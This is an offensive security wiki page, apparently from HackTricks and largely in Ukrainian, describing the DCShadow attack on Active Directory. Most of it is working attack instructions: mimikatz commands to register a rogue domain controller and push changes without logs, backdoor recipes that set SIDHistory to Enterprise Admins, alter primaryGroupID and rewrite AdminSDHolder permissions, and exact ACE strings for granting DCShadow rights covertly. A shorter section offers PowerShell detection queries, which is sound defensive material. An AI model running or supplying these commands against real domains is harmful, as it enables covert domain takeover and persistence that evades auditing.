# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Основна інформація

Реєструє **new Domain Controller** в **AD** і використовує його, щоб **push attributes** (SIDHistory, SPNs...) на вказаних об'єктах **без** залишення будь-яких **logs** щодо **modifications**. Вам потрібні привілеї **DA** і потрібно перебувати в **root domain**.\
Зауважте, що якщо ви використаєте неправильні дані, з'являться досить потворні **logs**.

Для виконання атаки вам потрібні 2 інстанси mimikatz. Один з них запустить RPC servers з привілеями SYSTEM (тут ви маєте вказати зміни, які хочете виконати), а інший інстанс буде використовуватися для push the values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Зауважте, що **`elevate::token`** не працюватиме в сесії `mimikatz1`, оскільки це підвищувало привілеї потоку, але нам потрібно підвищити **привілеї процесу**.\
Ви також можете вибрати "LDAP" об'єкт: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Ви можете запушити зміни з DA або від користувача з такими мінімальними дозволами:

- In the **domain object**:
- _DS-Install-Replica_ (Додавання/видалення репліки у домені)
- _DS-Replication-Manage-Topology_ (Керування топологією реплікації)
- _DS-Replication-Synchronize_ (Синхронізація реплікації)
- The **Sites object** (and its children) in the **Configuration container**:
- _CreateChild and DeleteChild_
- The object of the **computer which is registered as a DC**:
- _WriteProperty_ (Not Write)
- The **target object**:
- _WriteProperty_ (Not Write)

Ви можете використати [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), щоб надати ці привілеї непривілейованому користувачу (зверніть увагу, що це залишить деякі логи). Це значно більш обмежено, ніж наявність привілеїв DA.\
Наприклад: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Це означає, що ім'я користувача _**student1**_, коли увійшло на машину _**mcorp-student1**_, має дозволи DCShadow над об'єктом _**root1user**_.

## Використання DCShadow для створення backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Зловживання основною групою, прогалини в перерахуванні та виявлення

- `primaryGroupID` є окремим атрибутом від списку `member` групи. DCShadow/DSInternals можуть записати його безпосередньо (наприклад, встановити `primaryGroupID=512` для **Domain Admins**) без контролю з боку LSASS на боксі, але AD все одно **переміщує** користувача: зміна PGID завжди позбавляє членства в попередній основній групі (така ж поведінка для будь-якої цільової групи), тому ви не можете зберегти старе членство в основній групі.
- Стандартні інструменти не дозволяють видалити користувача з його поточної основної групи (`ADUC`, `Remove-ADGroupMember`), тож зміна PGID зазвичай потребує прямих записів у каталозі (DCShadow/`Set-ADDBPrimaryGroup`).
- Інформація про членство непослідовна:
- **Включає** членів, що походять від основної групи: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Пропускає** членів, що походять від основної групи: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit при перегляді `member`, `Get-ADUser <user> -Properties memberOf`.
- Рекурсивні перевірки можуть пропустити членів основної групи, якщо **основна група сама є вкладеною** (наприклад, PGID користувача вказує на вкладену групу всередині Domain Admins); `Get-ADGroupMember -Recursive` або рекурсивні LDAP-фільтри не повернуть цього користувача, якщо рекурсія явно не розв’язує основні групи.
- Маніпуляції з DACL: зловмисники можуть **заборонити ReadProperty** для `primaryGroupID` на об'єкті користувача (або для атрибуту `member` групи для груп, що не захищені AdminSDHolder), приховуючи фактичне членство від більшості PowerShell-запитів; `net group` все одно розв’язує членство. Групи, захищені AdminSDHolder, скинуть такі заборони.

Detection/monitoring examples:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Перевіряйте привілейовані групи, порівнюючи вивід `Get-ADGroupMember` з `Get-ADGroup -Properties member` або ADSI Edit, щоб виявити розбіжності, спричинені `primaryGroupID` або прихованими атрибутами.

## Shadowception - Надання дозволів DCShadow за допомогою DCShadow (без записів про змінені дозволи)

Потрібно додати наступні ACE з SID нашого користувача в кінці:

- На об'єкті домену:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- На об'єкті комп'ютера атакуючого: `(A;;WP;;;UserSID)`
- На об'єкті цільового користувача: `(A;;WP;;;UserSID)`
- На об'єкті Sites у контейнері Configuration: `(A;CI;CCDC;;;UserSID)`

Щоб отримати поточний ACE об'єкта: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Зверніть увагу, що в цьому випадку потрібно зробити кілька змін, а не одну. Отже, у сесії **mimikatz1** (RPC server) використовуйте параметр **`/stack` з кожною зміною**, яку хочете зробити. Таким чином вам буде потрібно лише **`/push`** один раз, щоб виконати всі накопичені зміни на зловмисному сервері.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
